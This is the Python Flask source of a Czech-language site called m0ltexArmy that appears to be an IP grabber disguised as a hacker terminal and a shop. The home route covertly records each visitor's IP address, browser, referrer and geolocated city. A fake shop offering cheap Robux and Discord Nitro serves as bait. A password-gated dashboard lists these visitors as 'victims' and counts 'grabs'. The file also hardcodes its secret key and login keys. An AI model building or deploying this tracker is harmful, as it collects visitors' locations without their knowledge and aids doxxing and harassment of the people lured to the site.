from flask import Flask, request, session, redirect
from flask_socketio import SocketIO, emit
import sqlite3
import os
import requests
from datetime import datetime

app = Flask(__name__)
app.secret_key = "m0ltex_final_secret_2026"
socketio = SocketIO(app, cors_allowed_origins="*")

def init_db():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS visits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT, user_agent TEXT, browser TEXT, os TEXT, device TEXT,
                    referrer TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )""")
    c.execute("""CREATE TABLE IF NOT EXISTS unique_visits (
                    ip TEXT PRIMARY KEY, first_visit DATETIME, last_visit DATETIME,
                    visits INTEGER DEFAULT 1, user_agent TEXT, country TEXT, 
                    city TEXT, browser TEXT, os TEXT
                )""")
    conn.commit()
    conn.close()

init_db()

# ====================== SUPER IP DETECTION ======================
def get_real_ip():
    headers = [
        'CF-Connecting-IP', 'X-Forwarded-For', 'X-Real-IP', 'True-Client-IP',
        'X-Client-IP', 'X-Forwarded', 'Forwarded-For', 'X-Cluster-Client-IP',
        'CF-Pseudo-IP', 'X-Original-Forwarded-For'
    ]
    for h in headers:
        ip_list = request.headers.get(h)
        if ip_list:
            return ip_list.split(',')[0].strip()
    return request.remote_addr

def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon", timeout=6)
        data = r.json()
        if data.get("status") == "success":
            return data.get("country", "Unknown"), data.get("city", "Unknown")
    except:
        pass
    return "Unknown", "Unknown"

def parse_ua(ua):
    os = "Unknown"
    if "Windows" in ua: os = "Windows"
    elif "Android" in ua: os = "Android"
    elif "Mac" in ua: os = "macOS"
    elif "Linux" in ua: os = "Linux"
    elif "iPhone" in ua: os = "iOS"

    browser = "Unknown"
    if "Chrome" in ua and "Edg" not in ua: browser = "Chrome"
    elif "Firefox" in ua: browser = "Firefox"
    elif "Safari" in ua and "Chrome" not in ua: browser = "Safari"
    elif "Edge" in ua or "Edg" in ua: browser = "Edge"

    device = "Mobile" if any(x in ua for x in ["Mobile", "Android", "iPhone"]) else "Desktop"
    return browser, os, device

# ====================== HOME ======================
@app.route("/")
def home():
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ref = request.headers.get('Referer', 'Direct')
    browser, os_name, device = parse_ua(ua)
    country, city = get_location(ip)

    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("INSERT INTO visits (ip, user_agent, browser, os, device, referrer) VALUES (?, ?, ?, ?, ?, ?)",
              (ip, ua, browser, os_name, device, ref))
    
    c.execute("""INSERT OR REPLACE INTO unique_visits 
                 (ip, first_visit, last_visit, visits, user_agent, country, city, browser, os)
                 VALUES (?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 
                 COALESCE((SELECT visits+1 FROM unique_visits WHERE ip=?), 1), ?, ?, ?, ?, ?, ?)""",
              (ip, ip, ua, country, city, browser, os_name))
    conn.commit()
    conn.close()

    return """
<html>
<head>
<title>m0ltexArmy</title>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
    body { 
        margin:0; 
        background: url('https://images.unsplash.com/photo-1518709268805-4e9042af2176') no-repeat center center fixed; 
        background-size: cover; 
        color:#00ffcc; 
        font-family:monospace; 
        overflow:hidden; 
    }
    .overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.82); z-index:1; }
    .sidebar { width:75px; height:100vh; background:rgba(8,8,8,0.97); border-right:3px solid #ff0000;
               position:fixed; z-index:10; transition:0.5s; padding:25px 10px; overflow:hidden; }
    .sidebar:hover { width:280px; }
    .sidebar h1 { color:#ff0000; font-size:23px; margin-bottom:45px; white-space:nowrap; }
    .sidebar a { display:block; padding:13px 15px; color:#00ffcc; text-decoration:none; white-space:nowrap; transition:0.3s; }
    .sidebar a:hover { background:#1a0000; color:#ff0000; transform:translateX(12px); }
    .main { margin-left:95px; padding:40px; z-index:2; position:relative; }
    h1 { color:#ff0000; text-shadow:0 0 20px #ff0000; }
    #terminal { height:520px; background:rgba(0,0,0,0.92); border:2px solid #ff0000; padding:15px; overflow:auto; box-shadow:0 0 30px #ff0000; }
    #cmd { width:100%; background:#111; border:2px solid #ff0000; color:#00ffcc; padding:14px; margin-top:12px; }
</style>
</head>
<body>
<div class="overlay"></div>

<div class="sidebar">
    <h1>m0ltexArmy</h1>
    <a href="/">Home</a>
    <a href="/shop">Shop</a>
    <a href="/map">Live Map</a>
    <a href="/login">Login</a>
    <a href="/dashboard">Dashboard</a>
</div>

<div class="main">
    <h1>REALTIME TERMINAL v2.9</h1>
    <p>Online: <span id="online">0</span></p>
    <div id="terminal"></div>
    <input id="cmd" placeholder="Napiš /help ...">
</div>

<script>
var socket = io();
let term = document.getElementById("terminal");
socket.on("message", msg => { term.innerHTML += msg + "<br>"; term.scrollTop = term.scrollHeight; });
socket.on("online", count => document.getElementById("online").innerText = count);

document.getElementById("cmd").addEventListener("keypress", e => {
    if (e.key === "Enter") {
        let cmd = e.target.value.trim();
        if (cmd) socket.emit("command", cmd);
        e.target.value = "";
    }
});
</script>
</body>
</html>
"""

# ====================== SHOP ======================
@app.route("/shop")
def shop():
    return """
    <body style="background:#000; color:#00ffcc; font-family:monospace; padding:40px;">
    <h1 style="color:#ff0000;">m0ltexArmy SHOP</h1>
    <div style="display:flex; gap:25px; flex-wrap:wrap;">
        <div style="background:#111; border:2px solid #ff0000; padding:25px; width:340px;">
            <h2>Discord Nitro Boost</h2>
            <p><s>99.99$</s> → <strong style="color:#00ff00;">4.99$/rok</strong></p>
            <button onclick="alert('Nákup úspěšný (simulace)')" style="padding:14px 40px; background:#ff0000; color:black; border:none; cursor:pointer;">Koupit</button>
        </div>
        <div style="background:#111; border:2px solid #ff0000; padding:25px; width:340px;">
            <h2>MM2 Godly + Ancient Set</h2>
            <p><strong>5.99$</strong></p>
            <button onclick="alert('Skins přidány (simulace)')" style="padding:14px 40px; background:#ff0000; color:black; border:none; cursor:pointer;">Koupit</button>
        </div>
        <div style="background:#111; border:2px solid #ff0000; padding:25px; width:340px;">
            <h2>50 000 Robux</h2>
            <p><strong>8.99$</strong></p>
            <button onclick="alert('Robux přidány (simulace)')" style="padding:14px 40px; background:#ff0000; color:black; border:none; cursor:pointer;">Koupit</button>
        </div>
    </div>
    <br><a href="/" style="color:#ff6666;">← Zpět</a>
    </body>
    """

# ====================== DASHBOARD (pro Foundera) ======================
@app.route("/dashboard")
def dashboard():
    if "role" not in session:
        return redirect("/login")
    
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM visits"); total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM unique_visits"); unique = c.fetchone()[0]
    c.execute("SELECT ip, country, city, visits, last_visit FROM unique_visits ORDER BY last_visit DESC LIMIT 25")
    logs = c.fetchall()
    conn.close()

    rows = "<br>".join([f"{ip} | {country} | {city} | {visits}x | {time}" for ip,country,city,visits,time in logs])

    return f"""
    <body style="background:#000; color:#00ffcc; font-family:monospace; padding:30px;">
    <h1 style="color:#ff0000;">CONTROL PANEL — {session['role'].upper()}</h1>
    <p>Total grabs: <b>{total}</b> | Unique victims: <b>{unique}</b></p>
    <h2>Posledních 25 obětí:</h2>
    <div style="background:#111; padding:15px; border:1px solid #ff0000; max-height:650px; overflow:auto;">{rows}</div>
    <br><a href="/logout" style="color:#ff6666;">Logout</a>
    </body>
    """

# Zbytek (login, logout, map, socket) zůstává stejný jako minule...

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        key = request.form.get("key", "")
        if key == "FOUNDER123":
            session["role"] = "founder"
            return redirect("/dashboard")
        elif key == "STAFF123":
            session["role"] = "staff"
            return redirect("/dashboard")
        else:
            return "<h2 style='color:red;text-align:center;margin-top:100px;'>Špatné heslo!</h2><br><a href='/login'>← Zpět</a>"
    return """
    <body style="background:#000;color:#00ffcc;font-family:monospace;text-align:center;padding-top:150px;">
    <h1 style="color:#ff0000;">m0ltexArmy LOGIN</h1>
    <form method="post">
        <input type="text" name="key" placeholder="Zadej klíč" style="padding:15px;width:320px;background:#111;border:2px solid #ff0000;color:#00ffcc;"><br><br>
        <button style="padding:14px 50px;background:#ff0000;color:black;border:none;cursor:pointer;">PŘIHLAŠIT</button>
    </form>
    </body>
    """

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

@app.route("/map")
def map_page():
    return "<h1 style='color:#ff0000;text-align:center;margin-top:100px;'>Live Map se připravuje...</h1><a href='/'>← Home</a>"

online_users = 0

@socketio.on("connect")
def connect():
    global online_users
    online_users += 1
    emit("online", online_users, broadcast=True)

@socketio.on("disconnect")
def disconnect():
    global online_users
    online_users = max(0, online_users - 1)
    emit("online", online_users, broadcast=True)

if __name__ == "__main__":
    print("✅ m0ltexArmy v2.9 FINAL - Propracovaná verze")
    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), debug=False)
